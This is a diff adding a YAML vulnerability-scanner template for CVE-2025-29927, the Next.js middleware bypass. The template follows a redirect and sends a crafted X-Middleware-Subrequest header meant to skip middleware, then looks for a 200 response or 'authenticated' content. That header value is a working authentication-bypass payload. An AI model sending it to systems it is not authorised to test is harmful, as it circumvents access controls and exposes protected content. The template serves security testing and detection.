@@ -1,0 +1,46 @@
+id: nextjs-middleware-bypass-attempt
+
+info:
+  name: "Next.js Middleware Bypass Attempt (CVE-2025-29927)"
+  severity: medium
+  description: |
+    Detects Next.js middleware confusion vulnerabilities by observing 307 redirects
+    and actively attempting middleware subrequest header injection even when internal
+    redirect headers are absent.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      X-Nextjs-Data: "1"
+      Accept-Encoding: "gzip, deflate, br"
+      Accept: "*/*"
+    matchers:
+      - type: status
+        status:
+          - 307
+    extractors:
+      - type: regex
+        name: location
+        part: header
+        regex:
+          - "Location: (.*)"  # Optional: Extract target path for deeper followup
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{location}}"  # Follow the redirect if extracted
+    headers:
+      X-Middleware-Subrequest: "src/middleware:nowaf:src/middleware:src/middleware:middleware:pages/_middleware"
+      Content-Type: "application/json"
+      Accept: "*/*"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "authenticated"  # optional: customize to detect exposed content
+
